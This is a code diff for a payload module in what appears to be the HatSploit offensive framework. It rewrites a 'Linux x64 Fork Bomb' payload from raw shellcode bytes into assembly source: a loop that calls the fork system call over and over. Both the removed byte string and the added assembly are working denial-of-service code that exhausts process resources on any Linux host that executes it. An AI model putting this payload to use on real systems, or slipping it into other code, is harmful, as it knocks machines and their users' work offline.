@@ -6,9 +6,10 @@
 #
 
 from hatsploit.lib.payload import Payload
+from hatsploit.utils.payload import PayloadTools
 
 
-class HatSploitPayload(Payload):
+class HatSploitPayload(Payload, PayloadTools):
     details = {
         'Category': "stager",
         'Name': "Linux x64 Fork Bomb",
@@ -24,6 +25,13 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        return (
-            b"\x48\x31\xc0\x48\x83\xc0\x39\x0f\x05\xeb\xf5"
+        return self.assemble(
+            self.details['Architecture'],
+            """
+            start:
+                xor rax, rax
+                add rax, 57
+                syscall
+                jmp start
+            """
         )
